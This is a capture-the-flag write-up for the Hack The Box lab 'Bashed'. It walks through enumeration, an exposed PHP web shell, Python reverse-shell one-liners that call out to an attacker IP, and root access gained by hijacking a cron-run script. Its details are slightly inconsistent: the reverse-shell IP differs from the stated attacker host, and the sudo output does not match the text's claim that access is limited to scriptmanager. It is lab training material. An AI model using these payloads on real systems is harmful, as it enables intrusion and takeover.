# HTB: Bashed

## Engagement Overview

**Target:** Bashed  
**Box IP:** 10.10.10.68     
**Date:** 2025-07-06    
**Attacker Host:** 10.10.14.3   

---

### Objectives

- Enumerate open services and directories  
- Gain initial foothold via exposed web shell  
- Escalate to user and root  
- Capture user and root flags  

---

## Service Enumeration

### Nmap

```bash
nmap -sC -sV -oN nmap.txt 10.10.10.68
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

- Web page title: *Arrexel's Development Site*

### Directory Enumeration

```bash
dirbuster -u http://10.10.10.68 -w /usr/share/wordlists/dirb/common.txt
```

- `/dev/phpbash.min.php`  
- `/dev/phpbash.php`  
- `/uploads/`  

---

## Initial Access

Accessing the exposed shell at:

```
http://10.10.10.68/dev/phpbash.php
```

Confirmed `www-data`:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

```bash
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.16.2",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

Upgraded shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

`www-data` has `sudo` access to run commands as `scriptmanager` without password:

```
(ALL : ALL) NOPASSWD: ALL
```

Switched to `scriptmanager`, found writable `/scripts/` directory:  

```
-rw-r--r-- 1 scriptmanager scriptmanager test.py
-rw-r--r-- 1 root          root          test.txt
```

`test.txt` overwritten by cron → root executes `test.py`.  

### Root via Cron

Replaced `test.py` with reverse shell payload:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.2",1337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Caught root shell with netcat listener:  

```bash
nc -lvnp 1337
```

---

## House Cleaning

**Flags:**  

- `user.txt`: `501893517418a7460a6f616a86f3fd82`  
- `root.txt`: `25a9eb38a763d8a0f04af9a3fc390ee7`  

- Removed malicious `test.py` after escalation.  
- No persistence left on target.  

---

## Tools Utilized

- `nmap`, `dirbuster`  
- Python reverse shell  
- `/dev/phpbash.php` interactive shell  
- `linuxprivchecker`  

References:  

- https://github.com/sleventyeleven/linuxprivchecker  
- https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2  

---

## Key Takeaways

- Dev artifacts like `phpbash.php` can provide immediate shells.  
- Python reverse shells + TTY upgrades are critical for stability.  
- Cron jobs with writable scripts enable easy privilege escalation.  
- `sudo` misconfigurations with secondary users (e.g. `scriptmanager`) are dangerous and should be audited.  